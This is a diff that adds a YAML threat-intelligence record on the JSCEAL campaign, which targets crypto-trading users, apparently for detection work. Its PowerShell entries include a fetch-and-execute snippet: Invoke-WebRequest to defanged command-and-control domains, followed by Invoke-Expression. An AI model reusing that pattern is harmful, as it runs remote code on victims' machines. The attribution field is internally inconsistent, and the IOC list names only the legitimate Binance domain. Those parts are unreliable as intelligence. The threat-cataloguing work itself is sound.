@@ -1,0 +1,55 @@
+description: The JSCEAL campaign impersonates common crypto trading apps, using MSI
+  installers downloaded from fake websites promoted by malicious advertisements. The
+  infection chain involves elaborate script-based fingerprinting leading to a final
+  JSC payload.
+attribution:
+- APT group: Unspecified
+- Country: Russia (based on certificate observations)
+- APT Group X
+malware_families:
+- InfoStealer.Win.JSCeal.A
+- Node.zip
+TTPs:
+  processes:
+  - msedge_proxy.exe
+  - node.exe
+  commandline:
+  - msedge_proxy.exe --app= https://accounts.binance.com/en/login
+  - .\\node.exe -r .\\preflight.js .\\app.jsc
+  - msedge_proxy.exe --app=https://accounts.binance.com/en/login
+  powershell:
+  - $TaskName = "WindowsSoftwareHealthCheckerTask"
+  - $APIs = @("xhab.grpc-test[.]me", "llr.experimental-tech[.]com")
+  - $Response = Invoke-WebRequest -Uri $API -WebSession $WebSession -Headers @{ "X-Machine-Id"
+    = $GUID } -UseBasicParsing
+  - Invoke-Expression $Content
+  scripting_engine:
+  - JavaScript
+  - PowerShell
+  registry_keys:
+  - HKLM:\\SOFTWARE\\Microsoft\\Cryptography
+  - HKU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings
+  image_load: []
+  network_connections:
+  - msedge_proxy.exe -> https://accounts.binance.com/en/login
+  - node.exe -> hxxps://resolve-ns.pages[.]dev/manifest.json
+  - node.exe -> hxxp://127.0.0.1:30303
+  - process: msedge_proxy.exe
+    destination: accounts.binance.com
+    port: 443
+  file_activity:
+  - C:\\Recovery\\OEM
+  - HKU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings
+  - C:\Program Files\Microsoft\Edge\Application\msedge_proxy.exe
+  persistence:
+  - Scheduled Task with EventTrigger
+  pipes: []
+  process_relations:
+  - msedge_proxy.exe -> node.exe
+IOCs:
+- domain: accounts.binance.com
+authors:
+- Check Point Research
+reference: https://research.checkpoint.com/2025/jsceal-targets-crypto-apps/
+date_of_publication: July 29, 2025
+file_creation_date: July 30, 2025
